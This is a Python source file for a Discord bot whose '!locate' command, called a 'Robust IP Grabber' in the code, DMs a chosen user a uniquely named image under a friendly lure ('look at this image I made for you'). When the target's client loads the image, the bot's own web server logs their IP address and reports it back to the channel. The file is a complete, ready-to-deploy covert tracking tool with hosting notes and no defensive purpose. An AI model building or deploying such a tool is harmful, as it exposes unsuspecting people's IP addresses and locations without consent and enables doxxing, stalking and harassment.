import discord
from discord.ext import commands
import os
import random
import string
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import threading
import asyncio
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import logging
from datetime import datetime
import time
import urllib.parse

# --- Configuration ---
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# --- Logging Setup ---
# Log to console for Railway/Discord visibility
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger('IPLogger')

# Store IPs found during sessions
captured_ips = {}

# --- HTTP Server Setup ---
class IPLoggingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the path to get the filename
        parsed_path = urllib.parse.urlparse(self.path)
        filename = parsed_path.path.lstrip('/')
        
        # Security: Ensure it's a PNG and not trying to escape /tmp (basic check)
        if not filename.endswith('.png'):
            self.send_error(404, "Not Found")
            return
            
        filepath = os.path.join('/tmp', filename)
        
        if os.path.exists(filepath):
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(content)
                
                # LOG THE IP HERE
                client_ip = self.client_address[0]
                logger.info(f"[IP CAPTURED] Target IP: {client_ip} | Requested: {filename}")
                
                # Store in global dict for retrieval later
                captured_ips[filename] = client_ip
                
            except Exception as e:
                logger.error(f"Error serving {filename}: {e}")
                self.send_error(500)
        else:
            self.send_error(404, "File Not Found")

    def log_message(self, format, *args):
        # Optional: Log standard access logs too
        pass

def start_http_server():
    server = ThreadingHTTPServer(('0.0.0.0', 8080), IPLoggingHandler)
    print("HTTP Server started on port 8080")
    server.serve_forever()

http_thread = threading.Thread(target=start_http_server, daemon=True)
http_thread.start()

# --- Bot Events ---

@bot.event
async def on_ready():
    print(f'Bot ready! Logged in as {bot.user}')
    
    # Clean up /tmp on startup
    cleanup_tmp()

@bot.command()
@commands.cooldown(1, 10, commands.BucketType.user) # Limit spam
async def locate(ctx, user: discord.User = None):
    """
    Robust IP Grabber.
    1. Generates unique image.
    2. Saves to /tmp.
    3. Sends DM with Embed + Direct Link.
    4. Logs IP immediately when loaded.
    """
    if ctx.guild is None:
        await ctx.send("Can only use this command in a server.")
        return

    target = user or ctx.author
    
    # Generate unique ID and Image
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    img_data = generate_unique_image(random_id)
    
    filename = f"{random_id}.png"
    filepath = os.path.join('/tmp', filename)
    
    # Save image
    with open(filepath, 'wb') as f:
        f.write(img_data)
    
    # Construct URL
    # IMPORTANT: Replace with your actual Railway domain or Ngrok URL
    # You MUST set RAILWAY_DOMAIN env var or hardcode it here temporarily for testing
    railway_domain = os.getenv('RAILWAY_DOMAIN', 'https://your-app.railway.app')
    img_url = f"{railway_domain}/{filename}"
    
    # Create Embed
    embed = discord.Embed(
        title="Check this out!",
        description=f"Hey {target.name}, look at this image I made for you.",
        color=discord.Color.blue()
    )
    embed.set_image(url=img_url)
    
    # Send DM
    try:
        msg = await target.send(embed=embed)
        await ctx.send(f"👁️ **Target:** {target.name}\n⏳ **Sent. Waiting for load...**\n🔗 **Direct Link:** {img_url}")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {target.name}.")
        return

    # Wait briefly for the request to come in (optional, but helps sync)
    await asyncio.sleep(2)
    
    # Check if IP was captured
    ip = captured_ips.get(filename)
    if ip:
        await ctx.send(f"✅ **IP Captured:** `{ip}`")
    else:
        await ctx.send(f"⏳ **Waiting for target to click/load...** (Check logs if no IP appears)")

def generate_unique_image(random_id):
    """Generates a unique image using Pillow."""
    img = Image.new('RGB', (400, 400), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    
    # Draw a box
    d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
    
    # Add text
    try:
        font = ImageFont.truetype("arial.ttf", 40)
    except IOError:
        font = ImageFont.load_default()
        
    text = f"ID: {random_id}"
    bbox = d.textbbox((0, 0), text, font=font)
    w = bbox[2] - bbox[0]
    h = bbox[3] - bbox[1]
    x = 200 - w / 2
    y = 200 - h / 2
    d.text((x, y), text, fill=(0, 0, 0), font=font)
    
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    return buffer.getvalue()

def cleanup_tmp():
    """Remove old .png files from /tmp to prevent disk fill."""
    count = 0
    for filename in os.listdir('/tmp'):
        if filename.endswith('.png'):
            try:
                os.remove(os.path.join('/tmp', filename))
                count += 1
            except Exception:
                pass
    if count > 0:
        print(f"Cleaned up {count} old .png files from /tmp")

# Run Bot
try:
    bot.run(TOKEN)
except KeyboardInterrupt:
    print("Shutting down...")